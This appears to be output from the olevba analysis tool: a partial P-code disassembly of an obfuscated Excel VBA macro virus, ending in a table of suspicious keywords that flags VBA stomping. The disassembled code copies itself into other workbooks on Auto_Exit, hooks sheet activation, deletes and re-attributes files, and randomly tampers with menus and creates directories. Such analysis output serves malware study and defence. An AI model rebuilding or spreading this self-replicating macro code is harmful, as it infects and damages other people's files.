' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #110:
' 	OnError hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr 
' Line #111:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #112:
' 	OnError (GoTo 0) 
' Line #113:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsCall nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr 0x0002 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0009 "Auto_Exit"
' 	Concat 
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #117:
' 	ExitSub 
' Line #118:
' 	Label hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr 
' Line #119:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #120:
' 	Resume  
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Private Function mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr As Integer))
' Line #123:
' 	Dim 
' 	VarDefn mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh (As Integer)
' Line #124:
' 	Dim 
' 	VarDefn nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm (As Integer)
' Line #125:
' 	Dim 
' 	VarDefn nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn (As String)
' Line #126:
' 	Dim 
' 	VarDefn rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr (As Double)
' Line #127:
' 	Dim 
' 	VarDefn nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm (As Double)
' Line #128:
' 	Dim 
' 	VarDefn nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh (As Double)
' Line #129:
' 	Dim 
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Integer)
' Line #130:
' 	LitStr 0x0000 ""
' 	St nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn 
' Line #131:
' 	Ld rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr 
' 	St mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh 
' Line #132:
' 	StartForVariable 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh 
' 	For 
' Line #133:
' 	LitDI2 0x000A 
' 	LitDI2 0x003E 
' 	Div 
' 	St rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr 
' Line #134:
' 	LitDI2 0x0024 
' 	LitDI2 0x003E 
' 	Div 
' 	St nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm 
' Line #135:
' 	ArgsCall Read 0x0000 
' Line #136:
' 	ArgsLd Rnd 0x0000 
' 	St nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh 
' Line #137:
' 	ArgsCall Read 0x0000 
' Line #138:
' 	Ld nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh 
' 	Ld rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr 
' 	Lt 
' 	IfBlock 
' Line #139:
' 	LitDI2 0x0039 
' 	LitDI2 0x0030 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0030 
' 	Add 
' 	FnInt 
' 	St nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm 
' Line #140:
' 	Ld nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh 
' 	Ld nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm 
' 	Lt 
' 	ElseIfBlock 
' Line #141:
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	St nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm 
' Line #142:
' 	ElseBlock 
' Line #143:
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	St nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	Ld nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn 
' 	Ld nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn 
' Line #146:
' 	StartForVariable 
' 	Next 
' Line #147:
' 	Ld nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn 
' 	St mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn 
' Line #148:
' 	EndFunc 
' Line #149:
' 	FuncDefn (Private Sub rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh())
' Line #150:
' 	Dim 
' 	VarDefn mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Variant)
' Line #151:
' 	StartForVariable 
' 	Ld mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh 
' 	EndForVariable 
' 	LitStr 0x0006 "Format"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	MemLd MenuItems 
' 	ForEach 
' Line #152:
' 	Ld mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh 
' 	MemLd Caption 
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0003 "..."
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #153:
' 	StartForVariable 
' 	Next 
' Line #154:
' 	StartForVariable 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	EndForVariable 
' 	LitStr 0x0008 "Standard"
' 	Ld Application 
' 	ArgsMemLd Toolbars 0x0001 
' 	MemLd ToolbarButtons 
' 	ForEach 
' Line #155:
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0005 "Print"
' 	Eq 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0004 "Open"
' 	Eq 
' 	Or 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0004 "Save"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemSt Enabled 
' 	EndIf 
' Line #156:
' 	StartForVariable 
' 	Next 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub Auto_Close())
' Line #159:
' 	Ld ThisWorkbook 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Eq 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0008 "*EXTRAS*"
' 	Like 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ThisWorkbook 
' 	MemSt Saved 
' 	EndIf 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Private Sub hnmhmhrnnhmrhrmmnrhnrhmhnrmnrh())
' Line #162:
' 	OnError nhrmrnnnmnnhrrmhhhnhrmnmrmrnmn 
' Line #163:
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	ArgsLd mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn 0x0001 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn 0x0001 
' 	Concat 
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #164:
' 	Label nhrmrnnnmnnhrrmhhhnhrmnmrmrnmn 
' Line #165:
' 	ExitSub 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Private Sub hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn())
' Line #168:
' 	Ld ActiveWorkbook 
' 	MemLd ProtectStructure 
' 	Not 
' 	IfBlock 
' Line #169:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #170:
' 	Dim 
' 	VarDefn mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm (As Variant)
' Line #171:
' 	Dim 
' 	VarDefn mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn (As String)
' Line #172:
' 	Ld ActiveWorkbook 
' 	MemLd ActiveSheet 
' 	MemLd New 
' 	St mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn 
' Line #173:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	Set mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm 
' Line #174:
' 	Ld ThisWorkbook 
' 	ArgsMemCall Activate 0x0000 
' Line #175:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #176:
' 	Ld mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm 
' 	ArgsMemCall Activate 0x0000 
' Line #177:
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	ParamNamed before 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #178:
' 	StartWithExpr 
' 	Ld ActiveSheet 
' 	With 
' Line #179:
' 	LitDI2 0x015F 
' 	LitDI2 0x0009 
' 	Div 
' 	LitDI2 0x000E 
' 	Sub 
' 	ArgsLd mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn 0x0001 
' 	MemStWith New 
' Line #180:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #181:
' 	EndWith 
' Line #182:
' 	Ld ThisWorkbook 
' 	ArgsMemCall Activate 0x0000 
' Line #183:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #184:
' 	StartWithExpr 
' 	Ld mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm 
' 	With 
' Line #185:
' 	ArgsMemCallWith Activate 0x0000 
' Line #186:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Sheets 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #187:
' 	EndWith 
' Line #188:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	EndSub 
' Line #191:
' 	FuncDefn (Private Sub mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn())
' Line #192:
' 	Dim 
' 	VarDefn hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh (As String)
' Line #193:
' 	LitStr 0x0008 "Style..."
' 	St hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh 
' Line #194:
' 	ArgsCall Read 0x0000 
' Line #195:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "AutoFormat..."
' 	St hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh 
' 	EndIf 
' Line #196:
' 	OnError mrmhnhrhnmhrhmrmhhrhnrnhnnhhnr 
' Line #197:
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0003 "..."
' 	Concat 
' 	ParamNamed Caption 
' 	Ld hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh 
' 	ParamNamed before 
' 	LitStr 0x0006 "Format"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	MemLd MenuItems 
' 	ArgsMemCall Add 0x0002 
' Line #198:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0003 "..."
' 	Concat 
' 	LitStr 0x0006 "Format"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	MemSt Enabled 
' Line #199:
' 	Label mrmhnhrhnmhrhmrmhhrhnrnhnnhhnr 
' Line #200:
' 	ExitSub 
' Line #201:
' 	EndSub 
' Line #202:
' 	FuncDefn (Private Sub mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr())
' Line #203:
' 	Dim 
' 	VarDefn hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr (As Integer)
' Line #204:
' 	ArgsCall Read 0x0000 
' Line #205:
' 	LitDI2 0x000C 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr 
' Line #206:
' 	Ld hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr 
' 	LitDI2 0x0006 
' 	Le 
' 	IfBlock 
' Line #207:
' 	ArgsCall (Call) rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh 0x0000 
' Line #208:
' 	Ld hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr 
' 	SelectCase 
' Line #209:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #210:
' 	ArgsCall (Call) rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr 0x0000 
' Line #211:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #212:
' 	ArgsCall (Call) hnhhhhrrrrhhnrnhmmrnhnrrrmmmmm 0x0000 
' Line #213:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #214:
' 	ArgsCall (Call) hnmhmhrnnhmrhrmmnrhnrhmhnrmnrh 0x0000 
' Line #215:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #216:
' 	ArgsCall (Call) mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn 0x0000 
' Line #217:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #218:
' 	ArgsCall (Call) nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh 0x0000 
' Line #219:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #220:
' 	ArgsCall (Call) nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn 0x0000 
' Line #221:
' 	EndSelect 
' Line #222:
' 	EndIfBlock 
' Line #223:
' 	EndSub 
' Line #224:
' 	FuncDefn (Private Sub hnhhhhrrrrhhnrnhmmrnhnrrrmmmmm())
' Line #225:
' 	LitVarSpecial (True)
' 	LitStr 0x0008 "Auditing"
' 	Ld Application 
' 	ArgsMemLd Toolbars 0x0001 
' 	MemSt Visible 
' Line #226:
' 	EndSub 
' Line #227:
' 	FuncDefn (Sub Auto_Exit())
' Line #228:
' 	Dim 
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Variant)
' Line #229:
' 	Ld ActiveWorkbook 
' 	MemLd Modules 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #230:
' 	ArgsCall hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn 0x0000 
' Line #231:
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0114 
' 	LitDI2 0x000C 
' 	Div 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	Ne 
' 	ElseIfBlock 
' Line #232:
' 	ArgsCall hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn 0x0000 
' Line #233:
' 	ElseBlock 
' Line #234:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x001A 
' 	LitDI2 0x0002 
' 	Pwr 
' 	LitDI2 0x000A 
' 	Sub 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	Div 
' 	Add 
' 	Paren 
' 	LitDI2 0x0003 
' 	Mul 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr 0x0000 
' 	EndIf 
' Line #235:
' 	EndIfBlock 
' Line #236:
' 	EndSub 
' Line #237:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

